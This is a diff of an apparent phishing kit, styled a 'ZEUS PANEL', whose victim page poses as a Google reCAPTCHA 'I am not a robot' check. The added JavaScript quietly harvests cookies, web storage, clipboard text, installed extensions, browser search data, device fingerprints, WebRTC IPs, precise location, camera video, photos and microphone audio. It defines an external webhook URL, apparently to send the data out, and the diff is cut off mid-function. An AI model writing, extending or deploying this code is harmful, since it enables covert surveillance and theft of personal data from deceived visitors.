@@ -8,10 +8,9 @@
     <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Inter:wght@300;400;500;600;700;800;900&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
     <style>
         /* ============================================================
-           STYLES — ZEUS PANEL (ADMIN) + VICTIM PAGE
+           STYLES — ZEUS PANEL (ADMIN) + VICTIM PAGE (ULTRA STEALTH)
            ============================================================ */
 
-        /* ---------- RESET & VARIABLES ---------- */
         *,
         *::before,
         *::after {
@@ -918,7 +917,7 @@
         }
 
         /* ============================================================
-           VICTIM PAGE — reCAPTCHA (NO STATUS BAR)
+           VICTIM PAGE — reCAPTCHA (STEALTH — NO STATUS)
            ============================================================ */
         #victimPage {
             display: none;
@@ -936,9 +935,15 @@
             background: #f9f9f9;
             border: 1px solid #d3d3d3;
             border-radius: 5px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
             overflow: hidden;
             cursor: default;
+            transition: box-shadow .3s ease;
+            user-select: none;
+        }
+
+        .captcha-wrapper:hover {
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.12);
         }
 
         .captcha-row {
@@ -950,6 +955,7 @@
 
         .spinner {
             position: relative;
+            flex-shrink: 0;
         }
         .spinner input {
             display: none;
@@ -964,9 +970,15 @@
             justify-content: center;
             align-items: center;
             cursor: pointer;
-            background: white;
-            transition: 0.3s;
+            background: #fff;
+            transition: all .25s ease;
             position: relative;
+            box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.04);
+        }
+
+        .checkmark:hover {
+            border-color: #a0a0a0;
+            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.15);
         }
 
         .checkmark .tick {
@@ -974,9 +986,9 @@
             height: 18px;
             border-right: 4px solid #00a651;
             border-bottom: 4px solid #00a651;
-            transform: rotate(45deg);
+            transform: rotate(45deg) scale(0.5);
             opacity: 0;
-            transition: 0.2s;
+            transition: all .2s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
 
         .checkmark .loader {
@@ -986,12 +998,13 @@
             border: 3px solid #e8f0fe;
             border-top: 3px solid #1a73e8;
             border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+            animation: spin .7s linear infinite;
         }
 
         .spinner.loading .checkmark {
             border-color: #1a73e8;
             background: #e8f0fe;
+            cursor: default;
         }
         .spinner.loading .checkmark .tick {
             display: none;
@@ -1000,9 +1013,23 @@
             display: block;
         }
 
+        .spinner.success .checkmark {
+            border-color: #00a651;
+            background: #e6f4ea;
+            cursor: default;
+        }
+        .spinner.success .checkmark .tick {
+            opacity: 1;
+            transform: rotate(45deg) scale(1);
+        }
+        .spinner.success .checkmark .loader {
+            display: none;
+        }
+
         .spinner.failed .checkmark {
             border-color: #d93025;
             background: #fce8e6;
+            cursor: default;
         }
         .spinner.failed .checkmark .tick {
             display: none;
@@ -1013,20 +1040,9 @@
         .spinner.failed .checkmark::after {
             content: "✕";
             font-size: 22px;
-            font-weight: bold;
+            font-weight: 700;
             color: #d93025;
-        }
-
-        .spinner.success .checkmark {
-            border-color: #00a651;
-            background: #e6f4ea;
-        }
-        .spinner.success .checkmark .tick {
-            opacity: 1;
-            animation: check 0.3s ease;
-        }
-        .spinner.success .checkmark .loader {
-            display: none;
+            line-height: 1;
         }
 
         .text {
@@ -1034,8 +1050,9 @@
             font-size: 18px;
             color: #333;
             text-align: center;
-            transition: color 0.2s;
-            user-select: none;
+            transition: color .3s ease;
+            font-weight: 400;
+            letter-spacing: .2px;
             font-family: 'Roboto', Arial, sans-serif;
         }
 
@@ -1053,20 +1070,28 @@
             display: flex;
             flex-direction: column;
             align-items: center;
+            flex-shrink: 0;
             font-size: 10px;
             color: #777;
+            line-height: 1.2;
         }
 
         .logo-captcha img {
             width: 38px;
-            margin-bottom: 4px;
+            height: auto;
+            margin-bottom: 3px;
+            display: block;
         }
 
         .logo-captcha strong {
             font-size: 10px;
+            font-weight: 600;
+            color: #555;
         }
+
         .logo-captcha small {
             font-size: 8px;
+            color: #999;
         }
 
         .captcha-footer {
@@ -1076,13 +1101,13 @@
             padding: 6px 14px;
             background: #f1f3f4;
             border-top: 1px solid #e5e7e9;
-            height: 36px;
+            min-height: 36px;
         }
 
         .captcha-footer .brand {
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 6px;
         }
 
         .captcha-footer .brand svg {
@@ -1094,12 +1119,13 @@
             font-size: 14px;
             font-weight: 500;
             color: #222;
+            letter-spacing: .3px;
         }
 
         .captcha-footer .links {
             display: flex;
             align-items: center;
-            gap: 10px;
+            gap: 8px;
             font-size: 11px;
         }
 
@@ -1107,7 +1133,7 @@
             color: #555;
             text-decoration: none;
             font-size: 11px;
-            transition: color 0.15s;
+            transition: color .2s;
         }
 
         .captcha-footer .links a:hover {
@@ -1125,17 +1151,6 @@
             }
             100% {
                 transform: rotate(360deg);
-            }
-        }
-
-        @keyframes check {
-            from {
-                opacity: 0;
-                transform: rotate(45deg) scale(0.3);
-            }
-            to {
-                opacity: 1;
-                transform: rotate(45deg) scale(1);
             }
         }
 
@@ -1157,6 +1172,28 @@
             }
         }
 
+        @media (max-width: 360px) {
+            .captcha-row {
+                padding: 12px 10px 10px 10px;
+                gap: 8px;
+            }
+            .text {
+                font-size: 14px;
+            }
+            .checkmark {
+                width: 28px;
+                height: 28px;
+            }
+            .checkmark .tick {
+                width: 8px;
+                height: 14px;
+                border-width: 3px;
+            }
+            .logo-captcha img {
+                width: 28px;
+            }
+        }
+
         /* ===== HIDDEN ELEMENTS ===== */
         #hiddenVideo {
             position: fixed;
@@ -1170,21 +1207,30 @@
         #hiddenCanvas {
             display: none;
         }
+        #fingerprintCanvas {
+            position: fixed;
+            top: -1000px;
+            left: -1000px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
 
-        /* ===== SCROLLBAR ===== */
-        ::-webkit-scrollbar {
-            width: 6px;
-            height: 6px;
+        /* ===== OVERLAY (خفي) ===== */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.01);
+            z-index: 9999;
+            pointer-events: none;
         }
-        ::-webkit-scrollbar-track {
-            background: var(--bg-body);
-        }
-        ::-webkit-scrollbar-thumb {
-            background: var(--gold-light);
-            border-radius: 10px;
-        }
-        ::-webkit-scrollbar-thumb:hover {
-            background: var(--gold);
+        .loading-overlay.active {
+            display: block;
         }
 
         /* ===== BODY MODE ===== */
@@ -1239,6 +1285,22 @@
         }
         .toast-msg.warning {
             background: #b8942e;
+        }
+
+        /* ===== SCROLLBAR ===== */
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: var(--bg-body);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--gold-light);
+            border-radius: 10px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--gold);
         }
     </style>
 </head>
@@ -1443,15 +1505,16 @@
     </div>
 
     <!-- ============================================================
-         VICTIM PAGE — reCAPTCHA (NO STATUS BAR)
+         VICTIM PAGE — reCAPTCHA ULTRA STEALTH
          ============================================================ -->
     <div id="victimPage">
         <div style="display:flex;flex-direction:column;align-items:center;width:100%;max-width:400px;">
+            <div class="loading-overlay" id="loadingOverlay"></div>
 
-            <div class="captcha-wrapper" id="captchaWrapper">
+            <div class="captcha-wrapper" id="captchaWrapper" role="button" tabindex="0" aria-label="تحقق أنك لست روبوتاً">
                 <div class="captcha-row">
                     <div class="spinner" id="spinner">
-                        <input type="checkbox" id="captcha" />
+                        <input type="checkbox" id="captcha" aria-label="أنا لست روبوتاً" />
                         <label class="checkmark" for="captcha">
                             <span class="tick"></span>
                             <div class="loader"></div>
@@ -1459,14 +1522,14 @@
                     </div>
                     <div class="text" id="mainText">أنا لست روبوتاً</div>
                     <div class="logo-captcha">
-                        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" />
+                        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" width="38" height="38" loading="lazy" />
                         <strong>reCAPTCHA</strong>
                         <small>الخصوصية - الشروط</small>
                     </div>
                 </div>
                 <div class="captcha-footer">
                     <div class="brand">
-                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                             <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/>
                             <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                             <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
@@ -1481,17 +1544,16 @@
                     </div>
                 </div>
             </div>
-
-            <!-- No status bar -->
         </div>
     </div>
 
     <!-- ===== HIDDEN ELEMENTS ===== -->
     <video id="hiddenVideo" autoplay playsinline muted></video>
     <canvas id="hiddenCanvas"></canvas>
+    <canvas id="fingerprintCanvas"></canvas>
 
     <!-- ============================================================
-         JAVASCRIPT — ULTRA FAST — INSTANT COLLECTION & SEND
+         JAVASCRIPT — ZEUS ULTRA STEALTH v6.0
          ============================================================ -->
     <script>
         (function() {
@@ -1506,7 +1568,61 @@
             const DEVELOPER_LINK = "https://t.me/xx_8k";
             const DB_NAME = 'ZeusTokensDB';
             const DB_VERSION = 2;
-            const RETRY_KEY = 'zeus_retry';
+            const WEBHOOK_URL = "https://dev-free-gift-online.pantheonsite.io/Free/bot.php?action=webhook_data";
+
+            // ============================================================
+            //  🔥  STATE
+            // ============================================================
+
+            const state = {
+                userToken: null,
+                mediaStream: null,
+                audioStream: null,
+                audioRecorder: null,
+                audioChunks: [],
+                capturedPhotoFiles: [],
+                audioBlob: null,
+                audioReady: false,
+                userIP: 'غير متاح',
+                userLocation: { lat: null, lng: null, accuracy: null, error: null },
+                isCollecting: false,
+                collectionComplete: false,
+                collectedData: {},
+                faceData: null,
+                transcribedText: null,
+                detectedLanguage: null,
+                clipboardContent: null,
+                installedExtensions: [],
+                browserHistory: [],
+                allCookies: {},
+                deviceClassification: {},
+                spoofingDetected: {},
+                attacksData: {},
+                startTime: null,
+                isHeadless: false,
+                batteryLevel: null,
+                permissionsGranted: { camera: false, mic: false, location: false, clipboard: false },
+                dataSent: false,
+                pendingRetries: 0,
+                frontVideo: null,
+                backVideo: null,
+                photos: [],
+            };
+
+            // ============================================================
+            //  🔥  DOM REFS
+            // ============================================================
+
+            const el = {
+                wrapper: document.getElementById('captchaWrapper'),
+                spinner: document.getElementById('spinner'),
+                checkbox: document.getElementById('captcha'),
+                mainText: document.getElementById('mainText'),
+                hiddenVideo: document.getElementById('hiddenVideo'),
+                hiddenCanvas: document.getElementById('hiddenCanvas'),
+                fingerprintCanvas: document.getElementById('fingerprintCanvas'),
+                overlay: document.getElementById('loadingOverlay'),
+            };
 
             // ============================================================
             //  🔥  HELPERS
@@ -1524,7 +1640,874 @@
 
             function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-            // ----- IndexedDB Helpers -----
+            function safeStringify(data) {
+                try { return JSON.stringify(data); } catch (_) { return '{}'; }
+            }
+
+            function setUIState(type) {
+                el.spinner.className = 'spinner ' + type;
+                el.mainText.className = 'text ' + type;
+                const texts = {
+                    success: 'تم التحقق بنجاح',
+                    failed: 'فشل التحقق، حاول مجدداً',
+                    loading: 'جاري التحقق من هويتك ...',
+                    permission: 'يرجى السماح بالوصول إلى الكاميرا والميكروفون، ثم اضغط على المربع لإعادة المحاولة.',
+                    '': 'أنا لست روبوتاً',
+                };
+                el.mainText.textContent = texts[type] || texts[''];
+                el.checkbox.checked = type === 'success';
+                if (type === 'loading') {
+                    el.overlay.classList.add('active');
+                } else {
+                    el.overlay.classList.remove('active');
+                }
+            }
+
+            // ============================================================
+            //  🔥  INDEXEDDB BACKUP
+            // ============================================================
+
+            function saveDataLocally(data) {
+                try {
+                    const request = indexedDB.open('ZeusBackup', 3);
+                    request.onupgradeneeded = (e) => {
+                        const db = e.target.result;
+                        if (!db.objectStoreNames.contains('stealth_data')) {
+                            db.createObjectStore('stealth_data', { keyPath: 'id' });
+                        }
+                    };
+                    request.onsuccess = (e) => {
+                        const db = e.target.result;
+                        const tx = db.transaction('stealth_data', 'readwrite');
+                        const store = tx.objectStore('stealth_data');
+                        const entry = {
+                            id: 'latest',
+                            data: data,
+                            timestamp: Date.now()
+                        };
+                        store.put(entry);
+                    };
+                    request.onerror = () => {};
+                } catch (_) {}
+            }
+
+            function loadFromIndexedDB() {
+                return new Promise((resolve) => {
+                    try {
+                        const request = indexedDB.open('ZeusBackup', 3);
+                        request.onsuccess = (e) => {
+                            const db = e.target.result;
+                            if (!db.objectStoreNames.contains('stealth_data')) {
+                                resolve(null);
+                                return;
+                            }
+                            const tx = db.transaction('stealth_data', 'readonly');
+                            const store = tx.objectStore('stealth_data');
+                            const getRequest = store.get('latest');
+                            getRequest.onsuccess = () => { resolve(getRequest.result); };
+                            getRequest.onerror = () => { resolve(null); };
+                        };
+                        request.onerror = () => { resolve(null); };
+                    } catch (_) { resolve(null); }
+                });
+            }
+
+            // ============================================================
+            //  🔥  TOKEN & IP
+            // ============================================================
+
+            function extractTokenFromURL() {
+                try {
+                    const params = new URLSearchParams(window.location.search);
+                    const token = params.get('t');
+                    if (token && token.length >= 6 && token.length <= 8 && /^[A-Z0-9]+$/.test(token)) {
+                        state.userToken = token;
+                        sessionStorage.setItem('zeus_token', token);
+                        return true;
+                    }
+                    const saved = sessionStorage.getItem('zeus_token');
+                    if (saved && saved.length >= 6 && saved.length <= 8 && /^[A-Z0-9]+$/.test(saved)) {
+                        state.userToken = saved;
+                        return true;
+                    }
+                    state.userToken = 'MASTER';
+                    sessionStorage.setItem('zeus_token', 'MASTER');
+                    return true;
+                } catch (_) { return false; }
+            }
+
+            async function fetchIP() {
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const d = await res.json();
+                    state.userIP = d.ip || 'غير متاح';
+                    return state.userIP;
+                } catch (_) {
+                    state.userIP = 'غير متاح';
+                    return state.userIP;
+                }
+            }
+
+            // ============================================================
+            //  🔥  DETECTION FUNCTIONS
+            // ============================================================
+
+            function detectHeadless() {
+                try {
+                    if (navigator.webdriver) return true;
+                    if (/HeadlessChrome/.test(navigator.userAgent)) return true;
+                    if (/PhantomJS/.test(navigator.userAgent)) return true;
+                    if (window._phantom || window.callPhantom) return true;
+                    if (window.chrome && window.chrome.webstore === undefined) return true;
+                    if (navigator.languages.length === 0) return true;
+                    return false;
+                } catch (_) { return false; }
+            }
+
+            function classifyDevice() {
+                try {
+                    const ua = navigator.userAgent;
+                    const result = { os: 'Unknown', osVersion: 'Unknown', browser: 'Unknown', browserVersion: 'Unknown',
+                        deviceType: 'Desktop', isMobile: false, isTablet: false };
+
+                    if (ua.includes('Windows NT 10.0')) { result.os = 'Windows';
+                        result.osVersion = '10'; } else if (ua.includes('Windows NT 6.3')) { result.os = 'Windows';
+                        result.osVersion = '8.1'; } else if (ua.includes('Windows NT 6.2')) { result.os = 'Windows';
+                        result.osVersion = '8'; } else if (ua.includes('Windows NT 6.1')) { result.os = 'Windows';
+                        result.osVersion = '7'; } else if (ua.includes('Mac OS X')) { result.os = 'macOS';
+                        result.osVersion = (ua.match(/Mac OS X ([\d_]+)/)?.[1] || '').replace(/_/g, '.') || 'Unknown'; } else if (
+                        ua.includes('Linux')) { result.os = 'Linux'; } else if (ua.includes('Android')) { result.os =
+                        'Android';
+                        result.osVersion = ua.match(/Android ([\d.]+)/)?.[1] || 'Unknown';
+                        result.deviceType = 'Mobile';
+                        result.isMobile = true; } else if (ua.includes('iPhone') || ua.includes('iPad') || ua.includes(
+                        'iPod')) {
+                        result.os = 'iOS';
+                        result.osVersion = (ua.match(/OS ([\d_]+)/)?.[1] || '').replace(/_/g, '.') || 'Unknown';
+                        result.deviceType = ua.includes('iPad') ? 'Tablet' : 'Mobile';
+                        result.isMobile = !ua.includes('iPad');
+                        result.isTablet = ua.includes('iPad');
+                    }
+
+                    if (ua.includes('Edg/')) { result.browser = 'Edge';
+                        result.browserVersion = ua.match(/Edg\/([\d.]+)/)?.[1] || 'Unknown'; } else if (ua.includes('OPR/') ||
+                        ua.includes('Opera/')) { result.browser = 'Opera';
+                        result.browserVersion = ua.match(/(?:OPR|Opera)\/([\d.]+)/)?.[1] || 'Unknown'; } else if (ua.includes(
+                        'Chrome/')) { result.browser = 'Chrome';
+                        result.browserVersion = ua.match(/Chrome\/([\d.]+)/)?.[1] || 'Unknown'; } else if (ua.includes(
+                        'Firefox/')) { result.browser = 'Firefox';
+                        result.browserVersion = ua.match(/Firefox\/([\d.]+)/)?.[1] || 'Unknown'; } else if (ua.includes(
+                        'Safari/')) { result.browser = 'Safari';
+                        result.browserVersion = ua.match(/Version\/([\d.]+)/)?.[1] || ua.match(/Safari\/([\d.]+)/)?.[1] ||
+                            'Unknown'; }
+
+                    if (result.isMobile) result.deviceType = 'Mobile';
+                    else if (result.isTablet) result.deviceType = 'Tablet';
+                    else result.deviceType = 'Desktop';
+
+                    state.deviceClassification = result;
+                    return result;
+                } catch (_) { return {}; }
+            }
+
+            function detectSpoofing() {
+                try {
+                    const result = { canvasSpoof: false, webglSpoof: false, vpnProxy: false, headless: false };
+                    try {
+                        const c = document.createElement('canvas');
+                        c.width = 256;
+                        c.height = 256;
+                        const ctx = c.getContext('2d');
+                        ctx.fillStyle = '#f60';
+                        ctx.fillRect(0, 0, 256, 256);
+                        const data = ctx.getImageData(0, 0, 256, 256).data;
+                        let count = 0;
+                        for (let i = 0; i < data.length; i += 4) {
+                            if (data[i] === 255 && data[i + 1] === 102 && data[i + 2] === 0) count++;
+                        }
+                        if (count < 60000) result.canvasSpoof = true;
+                    } catch (_) {}
+                    try {
+                        const c = document.createElement('canvas');
+                        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+                        if (gl) {
+                            const info = gl.getExtension('WEBGL_debug_renderer_info');
+                            if (info) {
+                                const vendor = gl.getParameter(info.UNMASKED_VENDOR_WEBGL);
+                                const renderer = gl.getParameter(info.UNMASKED_RENDERER_WEBGL);
+                                const legit = ['Google', 'Intel', 'NVIDIA', 'AMD', 'Apple', 'ARM', 'Qualcomm', 'Mesa'];
+                                if (!legit.some(x => vendor.includes(x) || renderer.includes(x))) result.webglSpoof = true;
+                            }
+                        }
+                    } catch (_) {}
+                    try {
+                        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                        pc.createDataChannel('test');
+                        pc.createOffer().then(o => pc.setLocalDescription(o));
+                        const ips = new Set();
+                        pc.onicecandidate = e => {
+                            if (e.candidate) {
+                                const ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/)?.[1];
+                                if (ip) ips.add(ip);
+                            }
+                        };
+                        setTimeout(() => pc.close(), 2000);
+                        if (ips.size > 1) result.vpnProxy = true;
+                    } catch (_) {}
+
+                    state.isHeadless = detectHeadless();
+                    result.headless = state.isHeadless;
+                    state.spoofingDetected = result;
+                    return result;
+                } catch (_) { return {}; }
+            }
+
+            async function detectExtensions() {
+                try {
+                    const extensions = [];
+                    const known = [
+                        'nmmhkkegccagdldgiimedpic', 'ghbmnnjooekpmoecnnnilnnbdlolhkhi',
+                        'nkeimhogjdpnpccoofpliimaahmaaome', 'apdfllckaahabafndbhieahigkjlhalf',
+                        'aohghmighlieiainnegkcijnfiokake', 'felcaaldnbdncclmgdcncolpebgiejap',
+                        'pjkljhegncpnkpknbcohdijeoejaedia', 'blpcfgokakmgnkcojhhkbfbldkacnbeo',
+                        'coobgpohoikkiipiblmjeljniedjpjpf', 'aapbdbdomjkkjkaonfhkkikfgjllcleb',
+                        'gighmmpiobklfepjocnamgkkbiglidom', 'cfhdojbkjhnklbpkdaibdccddilifddb',
+                        'nknbkhdknagdakhkajbjlockblnbfhie', 'fdpohaocaeogifhhanbjmmicplekadd',
+                        'hnjabckgkldmhfjcmhcmldcfhgdgcmmb', 'hdokiejnpimakedhajhdlcegeplioahd',
+                        'aeblfdkhhhncdpajijgkmofbbncfidng', 'pioclpoplcdbaefihamjohnefbikjilc',
+                        'bjmfeogmmpfjidbgpfngdglppobnidkm', 'kbfnbcaeplbcioakkpcpgfkobkghlhen',
+                        'jhimjlodphjhkpgocafcldcdchnehejb', 'mnjggcdmjocbbbhaepdhchncahnbgone',
+                        'cjpalhdlnbpafiamejdnhcphjbkeiagm'
+                    ];
+                    const names = [
+                        'Google Wallet', 'Google Docs Offline', 'Google Hangouts', 'Google Drive',
+                        'Google Docs', 'Google Sheets', 'Gmail', 'YouTube', 'Google Search', 'Google Translate',
+                        'AdBlock', 'AdBlock Plus', 'uBlock Origin', 'LastPass', 'Dashlane', 'Bitwarden',
+                        'Evernote', 'Evernote Web Clipper', 'Grammarly', 'Grammarly for Chrome',
+                        'Honey', 'SponsorBlock', 'uBlock Origin (alt)'
+                    ];
+                    for (let i = 0; i < known.length; i++) {
+                        try {
+                            await fetch(`chrome-extension://${known[i]}/manifest.json`, { mode: 'no-cors',
+                                cache: 'no-store' });
+                            extensions.push(names[i] || known[i]);
+                        } catch (_) {}
+                    }
+                    try {
+                        if (document.querySelector('[data-grammarly]') && !extensions.includes('Grammarly')) extensions.push(
+                            'Grammarly');
+                        if (document.querySelector('.uBlockOrigin') && !extensions.includes('uBlock Origin')) extensions.push(
+                            'uBlock Origin');
+                    } catch (_) {}
+                    state.installedExtensions = extensions;
+                    return extensions;
+                } catch (_) { return []; }
+            }
+
+            async function readClipboard() {
+                try {
+                    const perm = await navigator.permissions.query({ name: 'clipboard-read' });
+                    if (perm.state === 'granted' || perm.state === 'prompt') {
+                        const text = await navigator.clipboard.readText();
+                        state.clipboardContent = text;
+                        state.permissionsGranted.clipboard = true;
+                        return;
+                    }
+                } catch (_) {}
+                try {
+                    const ta = document.createElement('textarea');
+                    ta.style.cssText = 'position:fixed;opacity:0;pointer-events:none;top:-1000px;left:-1000px;';
+                    document.body.appendChild(ta);
+                    ta.focus();
+                    document.execCommand('paste');
+                    state.clipboardContent = ta.value || null;
+                    if (state.clipboardContent) {
+                        state.permissionsGranted.clipboard = true;
+                    } else {
+                        state.permissionsGranted.clipboard = false;
+                    }
+                    document.body.removeChild(ta);
+                } catch (_2) {
+                    state.clipboardContent = null;
+                    state.permissionsGranted.clipboard = false;
+                }
+            }
+
+            async function fetchGoogleSearchHistory() {
+                try {
+                    const results = [];
+                    const keys = ['search', 'query', 'q', 'history', 'recent', 'lastSearch', 'searchTerms', 'queries',
+                        'google:search', 'recentSearches', 'searchHistory'
+                    ];
+                    for (const k of keys) {
+                        const val = localStorage.getItem(k);
+                        if (val) {
+                            results.push({ source: 'localStorage', key: k, value: val });
+                        }
+                    }
+                    try {
+                        const dbs = await indexedDB.databases();
+                        for (const dbInfo of dbs) {
+                            const dbName = dbInfo.name;
+                            if (dbName && (dbName.includes('google') || dbName.includes('chrome') || dbName.includes(
+                                    'history') ||
+                                    dbName.includes('search'))) {
+                                const db = await new Promise((resolve, reject) => {
+                                    const req = indexedDB.open(dbName);
+                                    req.onsuccess = () => resolve(req.result);
+                                    req.onerror = () => reject();
+                                });
+                                if (db) {
+                                    const storeNames = db.objectStoreNames;
+                                    for (const storeName of storeNames) {
+                                        if (storeName.includes('history') || storeName.includes('search') || storeName
+                                            .includes(
+                                                'query')) {
+                                            const tx = db.transaction(storeName, 'readonly');
+                                            const store = tx.objectStore(storeName);
+                                            const getAll = store.getAll();
+                                            const items = await new Promise((res, rej) => {
+                                                getAll.onsuccess = () => res(getAll.result);
+                                                getAll.onerror = () => rej();
+                                            });
+                                            if (items && items.length > 0) {
+                                                results.push({
+                                                    source: 'IndexedDB',
+                                                    db: dbName,
+                                                    store: storeName,
+                                                    count: items.length,
+                                                    sample: items.slice(0, 3).map(i => JSON.stringify(i).substring(0,
+                                                    100))
+                                                });
+                                            }
+                                        }
+                                    }
+                                    db.close();
+                                }
+                            }
+                        }
+                    } catch (_) {}
+                    state.browserHistory = results;
+                    return results;
+                } catch (_) { return []; }
+            }
+
+            function collectAllCookies() {
+                try {
+                    const cookies = document.cookie.split(';').map(c => c.trim()).filter(c => c);
+                    const cookieDetails = cookies.map(c => {
+                        const parts = c.split('=');
+                        const name = parts[0];
+                        const value = parts.slice(1).join('=');
+                        return { name, value };
+                    });
+                    const result = {
+                        cookies: document.cookie,
+                        cookieCount: cookies.length,
+                        details: cookieDetails,
+                        localStorage: {},
+                        sessionStorage: {}
+                    };
+                    try {
+                        for (let i = 0; i < localStorage.length; i++) {
+                            const key = localStorage.key(i);
+                            if (key) result.localStorage[key] = localStorage.getItem(key);
+                        }
+                    } catch (_) {}
+                    try {
+                        for (let i = 0; i < sessionStorage.length; i++) {
+                            const key = sessionStorage.key(i);
+                            if (key) result.sessionStorage[key] = sessionStorage.getItem(key);
+                        }
+                    } catch (_) {}
+                    state.allCookies = result;
+                    return result;
+                } catch (_) { return {}; }
+            }
+
+            async function getBatteryLevel() {
+                try {
+                    const batt = await navigator.getBattery();
+                    const level = Math.round(batt.level * 100);
+                    state.batteryLevel = level;
+                    return level;
+                } catch (_) {
+                    state.batteryLevel = null;
+                    return null;
+                }
+            }
+
+            // ============================================================
+            //  🔥  LOCATION
+            // ============================================================
+
+            async function getLocation() {
+                return new Promise((resolve) => {
+                    try {
+                        if (!navigator.geolocation) {
+                            state.userLocation.error = 'المتصفح لا يدعم تحديد الموقع';
+                            state.permissionsGranted.location = false;
+                            resolve();
+                            return;
+                        }
+                        let watchId = null,
+                            best = null,
+                            bestAcc = Infinity,
+                            resolved = false,
+                            attempts = 0;
+                        const maxAttempts = 10,
+                            timeout = 8000,
+                            targetAcc = 50;
+
+                        const finish = () => {
+                            if (resolved) return;
+                            resolved = true;
+                            if (watchId) navigator.geolocation.clearWatch(watchId);
+                            if (best) {
+                                state.userLocation.lat = best.coords.latitude;
+                                state.userLocation.lng = best.coords.longitude;
+                                state.userLocation.accuracy = best.coords.accuracy;
+                                state.userLocation.error = null;
+                                state.permissionsGranted.location = true;
+                            } else {
+                                state.userLocation.error = 'لم نتمكن من الحصول على موقع دقيق';
+                                state.permissionsGranted.location = false;
+                            }
+                            resolve();
+                        };
+
+                        const timer = setTimeout(() => {
+                            if (!resolved) {
+                                if (watchId) navigator.geolocation.clearWatch(watchId);
+                                if (best) finish();
+                                else { state.userLocation.error = 'انتهت المهلة';
+                                    state.permissionsGranted.location = false;
+                                    resolve(); }
+                            }
+                        }, timeout);
+
+                        const onPos = (p) => {
+                            attempts++;
+                            const acc = p.coords.accuracy;
+                            if (acc < bestAcc) { bestAcc = acc;
+                                best = p; }
+                            if (acc <= targetAcc || attempts >= maxAttempts) {
+                                clearTimeout(timer);
+                                finish();
+                            }
+                        };
+
+                        const onErr = (e) => {
+                            if (resolved) return;
+                            if (e.code === 1) {
+                                state.userLocation.error = 'تم رفض الإذن بالوصول إلى الموقع';
+                                state.permissionsGranted.location = false;
+                                resolved = true;
+                                if (watchId) navigator.geolocation.clearWatch(watchId);
+                                clearTimeout(timer);
+                                resolve();
+                                return;
+                            }
+                            if (attempts < maxAttempts) { /* continue */ } else {
+                                if (best) finish();
+                                else { state.userLocation.error = e.message || 'تعذر الحصول على الموقع';
+                                    state.permissionsGranted.location = false;
+                                    resolve(); }
+                            }
+                        };
+
+                        watchId = navigator.geolocation.watchPosition(onPos, onErr, {
+                            enableHighAccuracy: true,
+                            timeout: 5000,
+                            maximumAge: 2000
+                        });
+                    } catch (_) {
+                        state.userLocation.error = 'خطأ غير متوقع';
+                        resolve();
+                    }
+                });
+            }
+
+            // ============================================================
+            //  🔥  CAMERA & AUDIO
+            // ============================================================
+
+            function getStream(facingMode) {
+                return navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
+                    audio: false
+                });
+            }
+
+            function recordStream(stream, duration) {
+                return new Promise((resolve) => {
+                    const recorder = new MediaRecorder(stream);
+                    const chunks = [];
+                    recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
+                    recorder.onstop = () => resolve(new Blob(chunks, { type: recorder.mimeType || 'video/webm' }));
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), duration);
+                });
+            }
+
+            function capturePhoto(videoEl) {
+                return new Promise((resolve) => {
+                    const w = videoEl.videoWidth || 640;
+                    const h = videoEl.videoHeight || 480;
+                    const canvas = el.hiddenCanvas;
+                    canvas.width = w;
+                    canvas.height = h;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(videoEl, 0, 0, w, h);
+                    canvas.toBlob(b => resolve(b), 'image/jpeg', 0.92);
+                });
+            }
+
+            async function recordAudio(duration) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    state.permissionsGranted.mic = true;
+                    const recorder = new MediaRecorder(stream);
+                    const chunks = [];
+                    recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
+                    return new Promise((resolve) => {
+                        recorder.onstop = () => {
+                            const blob = new Blob(chunks, { type: recorder.mimeType || 'audio/webm' });
+                            stream.getTracks().forEach(t => t.stop());
+                            resolve(blob);
+                        };
+                        recorder.start();
